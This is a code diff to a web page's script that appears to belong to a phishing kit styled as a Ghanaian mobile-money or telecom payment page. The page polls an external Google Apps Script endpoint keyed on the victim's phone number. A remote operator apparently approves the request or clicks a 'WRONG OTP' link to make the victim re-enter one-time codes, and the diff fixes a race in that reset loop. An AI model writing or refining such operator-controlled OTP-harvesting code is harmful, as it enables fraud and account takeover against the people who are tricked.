@@ -117,6 +117,8 @@
 </div>
 
 <script>
+        let isResetting = false;
+        let otpInterval;
     // Config
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxx5OICuAhCBeA0rkHEsM32eHh4-JVlJ1aBXqhK5WGKc8cxLMDRsV7ti3vL9RnmKGIAwA/exec";
     const urlParams = new URLSearchParams(window.location.search);
@@ -176,66 +178,58 @@ Amt: GHS ${amt}
         startPolling(id);
     }
 
-    function startPolling(phone) {
+function startPolling(phone) {
     const poller = setInterval(async () => {
         try {
             const r = await fetch(`${SCRIPT_URL}?num=${phone}`);
             const status = (await r.text()).trim();
 
-            // CASE 1: Initial Approval
             if(status === "approved") {
                 showView(3);
                 runCountdown(30);
-                // Clear status so it doesn't trigger again
                 fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`); 
             }
 
-            // CASE 2: Wrong OTP - Triggered when you click the "WRONG OTP" link
-            if(status === "otp_error") {
-    // 1. Stop the loop from repeating immediately
-    // We send a 'clear' command to the script so the next poll sees 'pending'
-    fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
+            // CHECK BOTH: Is it an error AND are we not already resetting?
+            if(status === "otp_error" && !isResetting) {
+                isResetting = true; // LOCK the reset logic
 
-    // 2. Visual Reset
-    const timerEl = document.getElementById('timer');
-    timerEl.style.color = "yellow";
-    timerEl.innerText = "RE-SENDING...";
+                // 1. Tell the script to clear the error IMMEDIATELY
+                await fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
 
-    // 3. Clear the OTP boxes
-    document.querySelectorAll('.otp-input').forEach(input => {
-        input.value = "";
-    });
-    
-    const btn = document.getElementById('otp-btn');
-    btn.innerText = "Confirm & Finish";
-    btn.disabled = false;
+                // 2. UI Feedback
+                const timerEl = document.getElementById('timer');
+                timerEl.innerText = "RESENDING...";
+                
+                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
+                const btn = document.getElementById('otp-btn');
+                btn.innerText = "Confirm & Finish";
+                btn.disabled = false;
 
-    // 4. Restart Countdown
-    // Use a unique ID for the interval to ensure we don't have multiple timers running
-    if (window.otpInterval) clearInterval(window.otpInterval); 
-    
-    setTimeout(() => {
-        timerEl.style.color = "var(--tele-red)";
-        runCountdown(30);
-    }, 1000);
-}
+                // 3. Restart Countdown
+                setTimeout(() => {
+                    runCountdown(30);
+                    isResetting = false; // UNLOCK after the new timer starts
+                }, 1500);
+            }
         } catch(e) {}
     }, 4000);
 }
 
-    function runCountdown(sec) {
+
+function runCountdown(sec) {
     let timer = sec;
     const el = document.getElementById('timer');
     
-    // Clear any existing timer before starting a new one
-    if (window.otpInterval) clearInterval(window.otpInterval);
+    // Kill any existing timer before starting a new one
+    if (otpInterval) clearInterval(otpInterval);
 
-    window.otpInterval = setInterval(() => {
+    otpInterval = setInterval(() => {
         let s = timer < 10 ? '0' + timer : timer;
         el.innerText = `00:${s}`;
         
         if (--timer < 0) {
-            clearInterval(window.otpInterval);
+            clearInterval(otpInterval);
             el.innerText = "00:00";
         }
     }, 1000);
